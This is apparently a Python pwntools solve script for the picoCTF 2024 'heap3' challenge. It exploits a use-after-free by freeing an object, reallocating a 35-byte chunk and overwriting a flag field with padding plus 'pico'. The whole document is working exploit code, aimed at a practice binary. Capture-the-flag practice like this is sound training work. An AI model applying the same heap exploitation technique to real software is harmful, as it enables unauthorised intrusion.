#!/usr/bin/env python3
"""picoCTF 2024 - heap3 solve script
Vulnerability: UAF - dangling pointer after free
Technique: Free x -> malloc same size -> overwrite flag field to "pico"
"""
from pwn import *

context.arch = 'amd64'
exe = context.binary = ELF("./binary", checksec=False)

def start():
    return process(exe.path)

io = start()

# Free x
io.sendlineafter(b"Enter your choice: ", b"5")

# Allocate same size (35 bytes = struct size)
io.sendlineafter(b"Enter your choice: ", b"2")
io.sendlineafter(b"Size of object allocation: ", b"35")

# Overwrite flag field: 30 bytes padding + "pico"
io.sendlineafter(b"Data for flag: ", b"A"*30 + b"pico")

# Check win
io.sendlineafter(b"Enter your choice: ", b"4")

io.interactive()
